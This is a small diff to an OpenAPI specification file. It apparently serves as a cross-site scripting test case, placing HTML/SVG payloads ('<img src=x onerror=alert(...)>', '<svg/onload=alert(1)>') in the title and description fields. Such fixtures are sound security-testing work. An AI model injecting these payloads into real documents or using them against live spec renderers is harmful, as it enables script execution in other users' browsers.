@@ -1,8 +1,9 @@
 {
   "openapi": "3.0.0",
   "info": {
-    "title": "<img src=x onerror=alert(document.domain)>",
-    "description": "xss"
+    "title": "<img src=x onerror=alert(document.domain)>", 
+    "title": "<img src=x onerror=alert(1)>",
+    "description": "<svg/onload=alert(1)>"
   },
   "paths": {}
 }
